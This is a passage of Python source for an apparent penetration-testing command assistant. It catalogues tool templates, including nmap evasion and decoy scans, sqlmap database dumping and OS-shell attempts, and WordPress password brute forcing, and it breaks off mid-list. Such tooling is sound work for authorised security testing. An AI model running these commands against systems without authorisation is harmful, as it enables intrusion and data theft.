#!/usr/bin/env python3
"""
Toolbox - Your Cybersecurity Command Assistant
A command-line tool that helps you remember and execute cybersecurity commands.

Version: 2.0 - Professional Edition
Features: History, Favorites, Workflows, Templates, Output Management, Multi-Target Support
"""

import os
import sys
import subprocess
import json
import argparse
from pathlib import Path
from datetime import datetime
import shutil
import re
from typing import List, Dict, Optional
try:
    import readline
except ImportError:
    readline = None

# Import AI module
try:
    from toolbox_ai import ToolboxAI, AICommandValidator
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False
    ToolboxAI = None
    AICommandValidator = None

class Toolbox:
    def __init__(self):
        self.tools_db = self._initialize_tools_database()
        self.common_wordlists = self._initialize_wordlists()
        self.config_dir = Path.home() / ".toolbox"
        self.history_file = self.config_dir / "history.json"
        self.favorites_file = self.config_dir / "favorites.json"
        self.config_file = self.config_dir / "config.json"
        self.templates_file = self.config_dir / "templates.json"
        self.workflows_file = self.config_dir / "workflows.json"
        self.custom_commands_file = self.config_dir / "custom_commands.json"
        self.output_dir = self.config_dir / "outputs"
        self.last_output_file = None  # Track last output file for saving
        self._initialize_config()
        self.tool_categories = self._initialize_categories()
        self._load_custom_commands()
        
        # Initialize AI if available
        self.ai = None
        if AI_AVAILABLE and ToolboxAI:
            try:
                self.ai = ToolboxAI(self.tools_db, self.config_dir)
            except Exception as e:
                print(f"[!] AI initialization failed: {e}")
                self.ai = None
    
    def input_with_prefill(self, prompt, text):
        """Input with pre-filled text that can be edited"""
        def hook():
            readline.insert_text(text)
            readline.redisplay()
        
        if readline:
            readline.set_pre_input_hook(hook)
            try:
                result = input(prompt)
            finally:
                readline.set_pre_input_hook()
            return result
        else:
            # Fallback if readline not available
            print(f"{prompt}{text}")
            return input("Edit: ") or text
        
    def _initialize_config(self):
        """Initialize configuration directory and files"""
        # Create config directory
        self.config_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
        
        # Create subdirectories
        (self.output_dir / "scans").mkdir(exist_ok=True)
        (self.output_dir / "reports").mkdir(exist_ok=True)
        
        # Initialize history
        if not self.history_file.exists():
            self.history_file.write_text("[]")
        
        # Initialize favorites
        if not self.favorites_file.exists():
            self.favorites_file.write_text("[]")
        
        # Initialize config
        if not self.config_file.exists():
            default_config = {
                "default_wordlist": "",
                "output_auto_save": False,
                "show_banner": True,
                "history_limit": 1000,
                "theme": "default"
            }
            self.config_file.write_text(json.dumps(default_config, indent=2))
        
        # Initialize templates
        if not self.templates_file.exists():
            self.templates_file.write_text("{}")
        
        # Initialize workflows
        if not self.workflows_file.exists():
            self.workflows_file.write_text("{}")
        
        # Initialize custom commands
        if not self.custom_commands_file.exists():
            self.custom_commands_file.write_text("[]")
    
    def _load_custom_commands(self):
        """Load custom user commands and merge with tool database"""
        try:
            custom_cmds = json.loads(self.custom_commands_file.read_text())
            for cmd in custom_cmds:
                tool_name = cmd.get("name")
                if tool_name and tool_name not in self.tools_db:
                    # Add custom command to tool database
                    self.tools_db[tool_name] = {
                        "description": cmd.get("description", "Custom user command"),
                        "commands": [{
                            "command": cmd.get("command"),
                            "description": cmd.get("description", "Custom command")
                        }],
                        "requires_target": cmd.get("requires_target", False),
                        "requires_wordlist": False,
                        "custom": True  # Mark as custom
                    }
        except Exception as e:
            pass  # Silently ignore if custom commands can't be loaded
    
    def _initialize_categories(self):
        """Initialize tool categories for smart search"""
        return {
            "reconnaissance": ["nmap", "rustscan", "masscan", "whois", "dig", "nslookup"],
            "scanning": ["nmap", "rustscan", "masscan", "nikto", "nuclei"],
            "web": ["nikto", "wpscan", "sqlmap", "nuclei", "burpsuite", "zaproxy"],
            "directorybrutforce": ["gobuster", "dirb", "ffuf", "feroxbuster", "wfuzz"],
            "directory": ["gobuster", "dirb", "ffuf", "feroxbuster", "wfuzz"],
            "bruteforce": ["hydra", "medusa", "gobuster", "ffuf", "john", "hashcat"],
            "passwords": ["hydra", "medusa", "john", "hashcat"],
            "cracking": ["john", "hashcat", "aircrack-ng"],
            "enumeration": ["enum4linux", "smbmap", "crackmapexec", "dnsrecon", "dnsenum"],
            "subdomain": ["sublist3r", "subfinder", "assetfinder", "amass"],
            "crypto": ["openssl", "gpg", "base64", "steghide", "hash-identifier"],
            "reversing": ["binwalk", "strings", "objdump", "radare2", "gdb", "ghidra"],
            "forensics": ["volatility", "autopsy", "foremost", "binwalk", "exiftool"],
            "exploitation": ["msfconsole", "searchsploit", "msfvenom"],
            "privesc": ["linpeas", "winpeas", "pspy"],
            "network": ["netcat", "curl", "wget", "chisel"],
            "wireless": ["aircrack-ng"],
            "osint": ["theHarvester", "spiderfoot", "hakrawler"],
            "xss": ["dalfox", "xsser"],
            "sql": ["sqlmap"],
            "api": ["arjun", "jwt_tool"]
        }
    
    def get_category_tools(self, category: str) -> List[str]:
        """Get tools for a specific category"""
        category = category.lower().replace(" ", "").replace("-", "")
        return self.tool_categories.get(category, [])
    
    def search_by_category(self, query: str) -> Dict:
        """Search tools by category or keyword"""
        query = query.lower().replace(" ", "").replace("-", "")
        results = {"exact": [], "partial": [], "description": []}
        
        # Check categories
        if query in self.tool_categories:
            results["exact"] = self.tool_categories[query]
        
        # Check partial category matches
        for category, tools in self.tool_categories.items():
            if query in category and query != category:
                results["partial"].extend(tools)
        
        # Check tool names and descriptions
        for tool_name, tool_info in self.tools_db.items():
            if query in tool_name:
                if tool_name not in results["exact"] and tool_name not in results["partial"]:
                    results["description"].append(tool_name)
            elif query in tool_info["description"].lower():
                if tool_name not in results["exact"] and tool_name not in results["partial"]:
                    results["description"].append(tool_name)
        
        # Remove duplicates
        results["partial"] = list(set(results["partial"]))
        results["description"] = list(set(results["description"]))
        
        return results
    
    def add_to_history(self, tool: str, command: str, target: str = ""):
        """Add command to history"""
        try:
            history = json.loads(self.history_file.read_text())
            entry = {
                "timestamp": datetime.now().isoformat(),
                "tool": tool,
                "command": command,
                "target": target
            }
            history.append(entry)
            
            # Limit history size
            config = json.loads(self.config_file.read_text())
            limit = config.get("history_limit", 1000)
            if len(history) > limit:
                history = history[-limit:]
            
            self.history_file.write_text(json.dumps(history, indent=2))
        except Exception as e:
            print(f"[!] Error saving to history: {e}")
    
    def show_history(self, limit: int = 20):
        """Show command history"""
        try:
            history = json.loads(self.history_file.read_text())
            if not history:
                print("[!] No history found")
                return
            
            print(f"\n[+] Last {min(limit, len(history))} commands:")
            for i, entry in enumerate(reversed(history[-limit:]), 1):
                timestamp = datetime.fromisoformat(entry["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
                print(f"  {i}. [{timestamp}] {entry['tool']}: {entry['command']}")
                if entry.get("target"):
                    print(f"     Target: {entry['target']}")
        except Exception as e:
            print(f"[!] Error reading history: {e}")
    
    def add_to_favorites(self, tool: str, command: str, name: str = ""):
        """Add command to favorites"""
        try:
            favorites = json.loads(self.favorites_file.read_text())
            entry = {
                "name": name or f"{tool}_{len(favorites)+1}",
                "tool": tool,
                "command": command,
                "added": datetime.now().isoformat()
            }
            favorites.append(entry)
            self.favorites_file.write_text(json.dumps(favorites, indent=2))
            print(f"[+] Added to favorites as '{entry['name']}'")
        except Exception as e:
            print(f"[!] Error saving to favorites: {e}")
    
    def show_favorites(self):
        """Show favorite commands"""
        try:
            favorites = json.loads(self.favorites_file.read_text())
            if not favorites:
                print("[!] No favorites found")
                return
            
            print("\n[+] Favorite commands:")
            for i, entry in enumerate(favorites, 1):
                print(f"  {i}. {entry['name']}")
                print(f"     Tool: {entry['tool']}")
                print(f"     Command: {entry['command']}")
        except Exception as e:
            print(f"[!] Error reading favorites: {e}")
    
    def save_output(self, tool: str, command: str, output: str, target: str = ""):
        """Save command output to file"""
        try:
            config = json.loads(self.config_file.read_text())
            if not config.get("output_auto_save", True):
                return
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_target = re.sub(r'[^\w\-_.]', '_', target) if target else "notarget"
            filename = f"{timestamp}_{tool}_{safe_target}.txt"
            filepath = self.output_dir / "scans" / filename
            
            with open(filepath, "w") as f:
                f.write(f"Tool: {tool}\n")
                f.write(f"Command: {command}\n")
                f.write(f"Target: {target}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write("=" * 80 + "\n\n")
                f.write(output)
            
            self.last_output_file = str(filepath)  # Store for custom save
            print(f"[+] Output saved to: {filepath}")
        except Exception as e:
            print(f"[!] Error saving output: {e}")
    
    def save_template(self, name: str, command: str, description: str = ""):
        """Save a command template"""
        try:
            templates = json.loads(self.templates_file.read_text())
            templates[name] = {
                "command": command,
                "description": description,
                "created": datetime.now().isoformat()
            }
            self.templates_file.write_text(json.dumps(templates, indent=2))
            print(f"[+] Template '{name}' saved")
        except Exception as e:
            print(f"[!] Error saving template: {e}")
    
    def show_templates(self):
        """Show saved templates"""
        try:
            templates = json.loads(self.templates_file.read_text())
            if not templates:
                print("[!] No templates found")
                return
            
            print("\n[+] Saved templates:")
            for name, data in templates.items():
                print(f"  - {name}: {data['command']}")
                if data.get("description"):
                    print(f"    Description: {data['description']}")
        except Exception as e:
            print(f"[!] Error reading templates: {e}")
    
    def use_template(self, name: str, **kwargs):
        """Use a saved template with variables"""
        try:
            templates = json.loads(self.templates_file.read_text())
            if name not in templates:
                print(f"[!] Template '{name}' not found")
                return None
            
            command = templates[name]["command"]
            for key, value in kwargs.items():
                command = command.replace(f"{{{key}}}", value)
            
            return command
        except Exception as e:
            print(f"[!] Error using template: {e}")
            return None
    
    # ==================== Custom Commands Management ====================
    
    def add_custom_command(self, name: str = None, command: str = None, description: str = None, requires_target: bool = False):
        """Add a custom command to the toolbox"""
        try:
            # Interactive mode if parameters not provided
            if not name:
                name = input("Command name (e.g., my-nmap-scan): ").strip()
                if not name:
                    print("[!] Name is required")
                    return
            
            # Check if already exists
            if name in self.tools_db and not self.tools_db[name].get("custom"):
                print(f"[!] '{name}' is a built-in tool. Use a different name.")
                return
            
            if not command:
                print("\nEnter the command template:")
                print("Use {target} for target placeholder if needed")
                print("Example: nmap -p- -sV -sC {target}")
                command = input("Command: ").strip()
                if not command:
                    print("[!] Command is required")
                    return
            
            if not description:
                description = input("Description (optional): ").strip() or f"Custom {name} command"
            
            if requires_target is False and "{target}" in command:
                requires_target = True
            
            # Load existing custom commands
            custom_cmds = json.loads(self.custom_commands_file.read_text())
            
            # Remove if updating
            custom_cmds = [cmd for cmd in custom_cmds if cmd.get("name") != name]
            
            # Add new command
            custom_cmds.append({
                "name": name,
                "command": command,
                "description": description,
                "requires_target": requires_target,
                "created": datetime.now().isoformat()
            })
            
            # Save
            self.custom_commands_file.write_text(json.dumps(custom_cmds, indent=2))
            
            # Add to current session
            self.tools_db[name] = {
                "description": description,
                "commands": [{
                    "command": command,
                    "description": description
                }],
                "requires_target": requires_target,
                "requires_wordlist": False,
                "custom": True
            }
            
            print(f"[+] Custom command '{name}' added successfully!")
            print(f"[+] Use it with: toolbox> use {name}")
            print(f"[+] Or with AI: toolbox> ai use my {name} on example.com")
            
        except Exception as e:
            print(f"[!] Error adding custom command: {e}")
    
    def list_custom_commands(self):
        """List all custom commands"""
        try:
            custom_cmds = json.loads(self.custom_commands_file.read_text())
            if not custom_cmds:
                print("\n[!] No custom commands found")
                print("[+] Add one with: toolbox> add-custom")
                return
            
            print("\n[+] Custom Commands:")
            for i, cmd in enumerate(custom_cmds, 1):
                print(f"\n{i}. {cmd['name']}")
                print(f"   Description: {cmd['description']}")
                print(f"   Command: {cmd['command']}")
                print(f"   Requires Target: {'Yes' if cmd.get('requires_target') else 'No'}")
                
        except Exception as e:
            print(f"[!] Error listing custom commands: {e}")
    
    def remove_custom_command(self, name: str = None):
        """Remove a custom command"""
        try:
            if not name:
                name = input("Command name to remove: ").strip()
                if not name:
                    print("[!] Name is required")
                    return
            
            custom_cmds = json.loads(self.custom_commands_file.read_text())
            original_len = len(custom_cmds)
            
            custom_cmds = [cmd for cmd in custom_cmds if cmd.get("name") != name]
            
            if len(custom_cmds) == original_len:
                print(f"[!] Custom command '{name}' not found")
                return
            
            self.custom_commands_file.write_text(json.dumps(custom_cmds, indent=2))
            
            # Remove from current session
            if name in self.tools_db and self.tools_db[name].get("custom"):
                del self.tools_db[name]
            
            print(f"[+] Custom command '{name}' removed")
            
        except Exception as e:
            print(f"[!] Error removing custom command: {e}")
    
    # ==================== End Custom Commands ====================
    
    def scan_wordlists(self):
        """Scan system for all available wordlists"""
        print("\n╔═══════════════════════════════════════════════════════╗")
        print("║          Wordlist Scanner                             ║")
        print("╚═══════════════════════════════════════════════════════╝")
        
        total_found = 0
        
        for list_type, wordlists in self.common_wordlists.items():
            available = [w for w in wordlists if os.path.exists(w)]
            
            if available:
                print(f"\n[+] {list_type.title()} Wordlists ({len(available)} found):")
                for wordlist in available:
                    size = os.path.getsize(wordlist)
                    size_mb = size / (1024 * 1024)
                    if size_mb < 1:
                        size_str = f"{size / 1024:.1f} KB"
                    else:
                        size_str = f"{size_mb:.1f} MB"
                    
                    # Count lines
                    try:
                        with open(wordlist, 'r', errors='ignore') as f:
                            lines = sum(1 for _ in f)
                        print(f"  ✓ {os.path.basename(wordlist)}")
                        print(f"    Path: {wordlist}")
                        print(f"    Size: {size_str} | Lines: {lines:,}")
                    except:
                        print(f"  ✓ {os.path.basename(wordlist)}")
                        print(f"    Path: {wordlist}")
                        print(f"    Size: {size_str}")
                    
                    total_found += 1
        
        print(f"\n[+] Total wordlists found: {total_found}")
        
        if total_found == 0:
            print("\n[!] No wordlists found on system")
            print("[!] Install SecLists with: sudo apt install seclists")
            print("[!] Or download from: https://github.com/danielmiessler/SecLists")
    
    def create_workflow(self, name: str):
        """Create a new workflow"""
        try:
            workflows = json.loads(self.workflows_file.read_text())
            if name in workflows:
                print(f"[!] Workflow '{name}' already exists")
                return
            
            workflows[name] = {
                "commands": [],
                "created": datetime.now().isoformat(),
                "description": ""
            }
            self.workflows_file.write_text(json.dumps(workflows, indent=2))
            print(f"[+] Workflow '{name}' created")
        except Exception as e:
            print(f"[!] Error creating workflow: {e}")
    
    def add_to_workflow(self, workflow_name: str, tool: str, command: str):
        """Add command to workflow"""
        try:
            workflows = json.loads(self.workflows_file.read_text())
            if workflow_name not in workflows:
                print(f"[!] Workflow '{workflow_name}' not found")
                return
            
            workflows[workflow_name]["commands"].append({
                "tool": tool,
                "command": command
            })
            self.workflows_file.write_text(json.dumps(workflows, indent=2))
            print(f"[+] Command added to workflow '{workflow_name}'")
        except Exception as e:
            print(f"[!] Error adding to workflow: {e}")
    
    def show_workflows(self):
        """Show all workflows"""
        try:
            workflows = json.loads(self.workflows_file.read_text())
            if not workflows:
                print("[!] No workflows found")
                return
            
            print("\n[+] Saved workflows:")
            for name, data in workflows.items():
                print(f"  - {name} ({len(data['commands'])} commands)")
                if data.get("description"):
                    print(f"    Description: {data['description']}")
        except Exception as e:
            print(f"[!] Error reading workflows: {e}")
    
    def run_workflow(self, name: str, target: str = ""):
        """Execute a workflow"""
        try:
            workflows = json.loads(self.workflows_file.read_text())
            if name not in workflows:
                print(f"[!] Workflow '{name}' not found")
                return
            
            workflow = workflows[name]
            print(f"\n[+] Running workflow: {name}")
            print(f"[+] Total commands: {len(workflow['commands'])}")
            
            for i, cmd_data in enumerate(workflow["commands"], 1):
                print(f"\n[{i}/{len(workflow['commands'])}] Running: {cmd_data['tool']}")
                command = cmd_data["command"]
                if target:
                    command = command.replace("{target}", target)
                
                execute = input(f"Execute: {command}? (y/n/s=skip all): ").strip().lower()
                if execute == 's':
                    break
                elif execute == 'y':
                    self.run_command(command)
                    self.add_to_history(cmd_data["tool"], command, target)
            
            print(f"\n[+] Workflow '{name}' completed")
        except Exception as e:
            print(f"[!] Error running workflow: {e}")
    
    def check_tool_availability(self):
        """Check which tools are installed"""
        print("\n[+] Checking tool availability...")
        available = []
        missing = []
        
        for tool in self.tools_db.keys():
            if shutil.which(tool) or shutil.which(tool.replace("-", "_")):
                available.append(tool)
            else:
                missing.append(tool)
        
        print(f"\n[+] Available: {len(available)} tools")
        print(f"[!] Missing: {len(missing)} tools")
        
        if missing:
            print("\n[!] Missing tools:")
            for tool in sorted(missing)[:20]:  # Show first 20
                print(f"  - {tool}")
            if len(missing) > 20:
                print(f"  ... and {len(missing) - 20} more")
    
    def prompt_install_tool(self, tool_name):
        """Prompt user to install a missing tool"""
        # Check if tool exists
        if shutil.which(tool_name):
            return True
        
        # Tool not found - ask to install
        print(f"\n[!] Tool '{tool_name}' is not installed on your system")
        response = input(f"[?] Would you like to install it now? (y/n): ").strip().lower()
        
        if response == 'y':
            print(f"\n[+] Installing {tool_name}...")
            try:
                # Try apt install
                result = subprocess.run(
                    f"sudo apt install -y {tool_name}",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    print(f"[+] {tool_name} installed successfully!")
                    return True
                else:
                    print(f"[!] Failed to install {tool_name}")
                    print(f"[!] Try manually: sudo apt install {tool_name}")
                    return False
            except Exception as e:
                print(f"[!] Error installing {tool_name}: {e}")
                return False
        else:
            print(f"[!] Skipping installation. Tool will not be available.")
            return False
    
    def show_tool_help(self, tool_name: str):
        """Show detailed help for a specific tool"""
        tool_name = tool_name.lower()
        if tool_name not in self.tools_db:
            print(f"[!] Tool '{tool_name}' not found")
            return
        
        tool_info = self.tools_db[tool_name]
        print(f"\n{'=' * 80}")
        print(f"Tool: {tool_name}")
        print(f"Description: {tool_info['description']}")
        print(f"Requires Target: {'Yes' if tool_info['requires_target'] else 'No'}")
        print(f"Requires Wordlist: {'Yes' if tool_info['requires_wordlist'] else 'No'}")
        print(f"Total Commands: {len(tool_info['commands'])}")
        print(f"{'=' * 80}")
        
        print(f"\n[+] Available commands for {tool_name}:")
        for i, cmd in enumerate(tool_info["commands"], 1):
            print(f"\n  {i}. {cmd['command']}")
            print(f"     {cmd['description']}")
        
        print(f"\n{'=' * 80}")
        print(f"Usage: toolbox use {tool_name}")
        print(f"       toolbox --tool {tool_name}")
        print(f"{'=' * 80}\n")
    
    def _initialize_tools_database(self):
        """Initialize the database of tools with their command variations"""
        return {
            # Reconnaissance & Scanning
            "nmap": {
                "description": "Network discovery and security auditing",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "nmap {target}",
                        "description": "Basic TCP scan on the target"
                    },
                    {
                        "command": "nmap -sV {target}",
                        "description": "Scan open ports and determine service/version info"
                    },
                    {
                        "command": "nmap -sS -sV -O {target}",
                        "description": "Stealth SYN scan with version detection and OS detection"
                    },
                    {
                        "command": "nmap -p- -T4 {target}",
                        "description": "Full port scan (1-65535) with aggressive timing"
                    },
                    {
                        "command": "nmap -A {target}",
                        "description": "Comprehensive scan including OS detection, version detection, script scanning, and traceroute"
                    },
                    {
                        "command": "nmap -sC {target}",
                        "description": "Scan with default NSE scripts"
                    },
                    {
                        "command": "nmap -p 80,443,22,21,25,53,110,143,993,995 {target}",
                        "description": "Scan common ports only"
                    },
                    {
                        "command": "nmap --script vuln {target}",
                        "description": "Scan for vulnerabilities using NSE scripts"
                    },
                    {
                        "command": "nmap -sU {target}",
                        "description": "UDP scan"
                    },
                    {
                        "command": "nmap -f {target}",
                        "description": "Fragment packets to evade firewalls/IDS"
                    },
                    {
                        "command": "nmap -Pn {target}",
                        "description": "Skip host discovery, treat all hosts as online (bypasses ping checks)"
                    },
                    {
                        "command": "nmap -v {target}",
                        "description": "Verbose mode, shows detailed scan progress"
                    },
                    {
                        "command": "nmap -T0 {target}",
                        "description": "Paranoid timing template - very slow, stealthy"
                    },
                    {
                        "command": "nmap -T1 {target}",
                        "description": "Sneaky timing template - slow, stealthy"
                    },
                    {
                        "command": "nmap -T2 {target}",
                        "description": "Polite timing template - slower than normal"
                    },
                    {
                        "command": "nmap -T3 {target}",
                        "description": "Normal timing template - default speed"
                    },
                    {
                        "command": "nmap -T4 {target}",
                        "description": "Aggressive timing template - faster, more likely to be detected"
                    },
                    {
                        "command": "nmap -T5 {target}",
                        "description": "Insane timing template - very fast, very noisy"
                    },
                    {
                        "command": "nmap -D RND:10 {target}",
                        "description": "Use random decoys to hide scan source"
                    },
                    {
                        "command": "nmap --source-port 53 {target}",
                        "description": "Use common port (DNS) as source port"
                    },
                    {
                        "command": "nmap -g 53 {target}",
                        "description": "Use port 53 as source port (same as --source-port)"
                    },
                    {
                        "command": "nmap --mtu 24 {target}",
                        "description": "Use specified MTU for fragmentation"
                    },
                    {
                        "command": "nmap -sS -Pn -n {target}",
                        "description": "Stealth scan without DNS resolution and ping check"
                    },
                    {
                        "command": "nmap --data-length 25 {target}",
                        "description": "Append random data to packets to avoid signature detection"
                    },
                    {
                        "command": "nmap -f -f -f {target}",
                        "description": "Multiple fragmentation levels for better evasion"
                    },
                    {
                        "command": "nmap -sS -sV -O -A -T4 {target}",
                        "description": "COMBINATION: Aggressive full scan with OS/service detection"
                    },
                    {
                        "command": "nmap -p- -sV -sC -A {target}",
                        "description": "COMBINATION: Complete port scan with scripts and version detection"
                    },
                    {
                        "command": "nmap -Pn -sS -sV -p- -T4 {target}",
                        "description": "COMBINATION: Full stealth scan bypassing ping, all ports"
                    },
                    {
                        "command": "nmap -sV -sC --script vuln -p- {target}",
                        "description": "COMBINATION: Full vulnerability scan with all ports"
                    },
                    {
                        "command": "nmap -sS -sU -sV -p- {target}",
                        "description": "COMBINATION: Both TCP and UDP scan with version detection"
                    },
                    {
                        "command": "nmap -Pn -f -D RND:10 -sS -p 80,443,22,21,3389 {target}",
                        "description": "COMBINATION: Stealth scan with fragmentation and decoys on key ports"
                    },
                    {
                        "command": "nmap -sV -sC -A --script=default,vuln,exploit {target}",
                        "description": "COMBINATION: Comprehensive scan with vulnerability and exploit scripts"
                    },
                    {
                        "command": "nmap -Pn -n -sS -sV -T4 --open {target}",
                        "description": "COMBINATION: Fast scan showing only open ports, no DNS resolution"
                    },
                    {
                        "command": "nmap -p- -T4 -A -v --reason {target}",
                        "description": "COMBINATION: Verbose full scan with reasons for port states"
                    },
                    {
                        "command": "nmap -sS -sV -O -Pn -p 1-65535 --script=banner,http-title {target}",
                        "description": "COMBINATION: Full stealth scan with banner grabbing and HTTP titles"
                    }
                ]
            },
            "rustscan": {
                "description": "Modern, fast port scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "rustscan -a {target}",
                        "description": "Basic fast port scan"
                    },
                    {
                        "command": "rustscan -a {target} --range 1-65535",
                        "description": "Full port range scan"
                    },
                    {
                        "command": "rustscan -a {target} -sS",
                        "description": "SYN scan with RustScan"
                    },
                    {
                        "command": "rustscan -a {target} -- -A",
                        "description": "Port scan with RustScan followed by Nmap detailed scan"
                    },
                    {
                        "command": "rustscan -a {target} -- -sV -sC",
                        "description": "Fast scan with service detection and scripts"
                    },
                    {
                        "command": "rustscan -a {target} -t 2000",
                        "description": "Scan with 2000 threads (very fast)"
                    }
                ]
            },
            "masscan": {
                "description": "TCP port scanner, spews SYN packets asynchronously",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "masscan {target} -p0-65535",
                        "description": "Full port scan on target"
                    },
                    {
                        "command": "masscan {target} -p80,443,22 --rate=1000",
                        "description": "Scan specific ports at specified rate"
                    },
                    {
                        "command": "masscan {target}/24 -p80 --rate=1000",
                        "description": "Scan entire subnet for port 80"
                    }
                ]
            },
            "netdiscover": {
                "description": "Active/passive ARP reconnaissance tool for network discovery",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "netdiscover -i eth0 -r {target}/24",
                        "description": "Scan subnet range on eth0 interface"
                    },
                    {
                        "command": "netdiscover -i eth0",
                        "description": "Auto scan on eth0 interface"
                    },
                    {
                        "command": "netdiscover -r {target}/24",
                        "description": "Scan specific subnet range (auto-detect interface)"
                    },
                    {
                        "command": "netdiscover -p",
                        "description": "Passive mode - don't send ARP requests, just listen"
                    },
                    {
                        "command": "netdiscover -i wlan0 -r {target}/24",
                        "description": "Scan subnet on wireless interface"
                    },
                    {
                        "command": "netdiscover -i eth0 -r {target}/24 -c 10",
                        "description": "Scan with 10 requests per discovery (faster)"
                    },
                    {
                        "command": "netdiscover -i eth0 -r {target}/24 -s 30",
                        "description": "Scan with 30 second sleep time between requests (stealthy)"
                    },
                    {
                        "command": "netdiscover -i eth0 -P",
                        "description": "Print results in a parseable format"
                    },
                    {
                        "command": "netdiscover -f",
                        "description": "Enable fast mode (don't check for duplicate IPs)"
                    }
                ]
            },
            "whois": {
                "description": "Domain/IP registration lookup",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "whois {target}",
                        "description": "Get whois information for domain/IP"
                    }
                ]
            },
            "dig": {
                "description": "DNS lookup utility",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "dig {target}",
                        "description": "Basic DNS lookup"
                    },
                    {
                        "command": "dig {target} ANY",
                        "description": "Query for all DNS records"
                    },
                    {
                        "command": "dig {target} MX",
                        "description": "Query for mail exchange records"
                    },
                    {
                        "command": "dig {target} TXT",
                        "description": "Query for TXT records"
                    },
                    {
                        "command": "dig {target} AXFR",
                        "description": "Attempt DNS zone transfer"
                    }
                ]
            },
            "nslookup": {
                "description": "Query Internet name servers interactively",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "nslookup {target}",
                        "description": "Basic DNS lookup"
                    },
                    {
                        "command": "nslookup -type=any {target}",
                        "description": "Query for all record types"
                    },
                    {
                        "command": "nslookup -type=mx {target}",
                        "description": "Query for MX records"
                    },
                    {
                        "command": "nslookup -type=ns {target}",
                        "description": "Query for NS records"
                    },
                    {
                        "command": "nslookup -type=txt {target}",
                        "description": "Query for TXT records"
                    }
                ]
            },
            
            # Web Application Testing
            "nikto": {
                "description": "Web server vulnerability scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "nikto -h http://{target}",
                        "description": "Basic scan of web server"
                    },
                    {
                        "command": "nikto -h http://{target} -Tuning 9",
                        "description": "Scan with all tests enabled"
                    },
                    {
                        "command": "nikto -h http://{target} -o report.html -Format htm",
                        "description": "Save scan results in HTML format"
                    },
                    {
                        "command": "nikto -h http://{target} -evasion 1",
                        "description": "Use random URI encoding to evade detection"
                    }
                ]
            },
            "wpscan": {
                "description": "WordPress security scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "wpscan --url http://{target}",
                        "description": "Basic WordPress scan"
                    },
                    {
                        "command": "wpscan --url http://{target} --enumerate p",
                        "description": "Enumerate plugins"
                    },
                    {
                        "command": "wpscan --url http://{target} --enumerate t",
                        "description": "Enumerate themes"
                    },
                    {
                        "command": "wpscan --url http://{target} --enumerate u",
                        "description": "Enumerate users"
                    },
                    {
                        "command": "wpscan --url http://{target} --passwords /path/to/wordlist.txt",
                        "description": "Brute force passwords using wordlist"
                    }
                ]
            },
            "sqlmap": {
                "description": "SQL injection detection and exploitation tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "sqlmap -u \"http://{target}/page.php?id=1\" --dbs",
                        "description": "Enumerate databases"
                    },
                    {
                        "command": "sqlmap -u \"http://{target}/page.php?id=1\" --tables -D dbname",
                        "description": "Enumerate tables in specified database"
                    },
                    {
                        "command": "sqlmap -u \"http://{target}/page.php?id=1\" --dump -D dbname -T tablename",
                        "description": "Dump data from specified table"
                    },
                    {
                        "command": "sqlmap -u \"http://{target}/page.php?id=1\" --os-shell",
                        "description": "Attempt to get an OS shell"
                    },
                    {
                        "command": "sqlmap -r request.txt --level=5 --risk=3",
                        "description": "Analyze HTTP request from file with max level and risk"
                    }
                ]
            },
            "nuclei": {
                "description": "Fast and customizable vulnerability scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "nuclei -u http://{target}",
                        "description": "Basic scan of target"
                    },
                    {
                        "command": "nuclei -u http://{target} -t cves/",
                        "description": "Scan for CVE vulnerabilities"
                    },
                    {
                        "command": "nuclei -u http://{target} -severity critical,high",
                        "description": "Scan for critical and high severity vulnerabilities"
                    },
                    {
                        "command": "nuclei -l targets.txt",
                        "description": "Scan multiple targets from file"
                    }
                ]
            },
            
            # Directory & Content Discovery
            "gobuster": {
                "description": "Directory/file, DNS and VHost busting tool",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "gobuster dir -u http://{target} -w {wordlist}",
                        "description": "Directory brute force with wordlist"
                    },
                    {
                        "command": "gobuster dir -u http://{target} -w {wordlist} -x php,txt,html",
                        "description": "Directory brute force with file extensions"
                    },
                    {
                        "command": "gobuster dir -u http://{target} -w {wordlist} -t 50",
                        "description": "Directory brute force with 50 threads"
                    },
                    {
                        "command": "gobuster vhost -u http://{target} -w {wordlist}",
                        "description": "Virtual host enumeration"
                    },
                    {
                        "command": "gobuster dns -d {target} -w {wordlist}",
                        "description": "DNS subdomain enumeration"
                    }
                ]
            },
            "dirb": {
                "description": "Web content scanner",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "dirb http://{target} {wordlist}",
                        "description": "Basic directory scan with wordlist"
                    },
                    {
                        "command": "dirb http://{target} {wordlist} -o output.txt",
                        "description": "Directory scan with output to file"
                    },
                    {
                        "command": "dirb http://{target} {wordlist} -X .php,.txt,.html",
                        "description": "Directory scan with specified file extensions"
                    },
                    {
                        "command": "dirb http://{target} {wordlist} -r",
                        "description": "Recursive directory scanning"
                    }
                ]
            },
            "ffuf": {
                "description": "Fast web fuzzer",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ",
                        "description": "Basic directory fuzzing"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -mc 200",
